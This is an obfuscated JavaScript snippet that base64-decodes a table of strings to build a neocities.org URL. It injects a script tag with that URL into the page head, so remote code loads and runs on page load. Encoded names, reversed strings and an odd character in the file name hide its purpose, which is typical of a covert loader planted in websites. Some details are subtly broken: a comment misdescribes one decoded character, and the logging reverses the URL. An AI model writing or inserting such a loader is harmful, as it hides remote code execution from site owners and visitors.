(function(){
  const x = atob, y = (s) => s.split('').reverse().join('');

  const b64 = [
    'Y3JlYXRlRWxlbWVudA==', // createElement
    'YXBwZW5kQ2hpbGQ=',     // appendChild
    'c2NyaXB0',             // script
    'dHlwZQ==',             // type
    'dGV4dC9qYXZhc2NyaXB0', // text/javascript
    'c3Jj',                 // src
    'b25sb2Fk',             // onload
    'b25lcnJvcg==',         // onerror
    'bG9n',                 // log
    'ZXJyb3I=',             // error
    'aGVhZA==',             // head
    'ZG9jdW1lbnQ=',         // document
    'aHR0cHM=',             // https
    'Oi8v',                 // ://
    'c2hhcmU=',             // share
    'Ym9vc3Rlcg==',         // booster
    'Lm5lbw==',             // .neo
    'Y2l0aWVz',             // cities
    'Lm9yZw==',             // .org
    'L3NjcmlwdDc=',         // /script7
    '4Y+E',                 // "ㅤ" (U+3164) zero-width
    'Lmpz'                  // .js
  ];

  const d = window[x(b64[11])];
  const s = d[x(b64[0])](x(b64[2]));

  const url = [
    x(b64[12]), x(b64[13]), x(b64[14]), x(b64[15]), x(b64[16]),
    x(b64[17]), x(b64[18]), x(b64[19]), x(b64[20]), x(b64[21])
  ].join('');

  s[x(b64[5])] = url;
  s[x(b64[3])] = x(b64[4]);

  s[x(b64[6])] = () => console[x(b64[8])](y('dedaol ' + url));
  s[x(b64[7])] = () => console[x(b64[9])](y(' ' + url + ' daol ot deliaF'));

  d[x(b64[10])][x(b64[1])](s);
})();
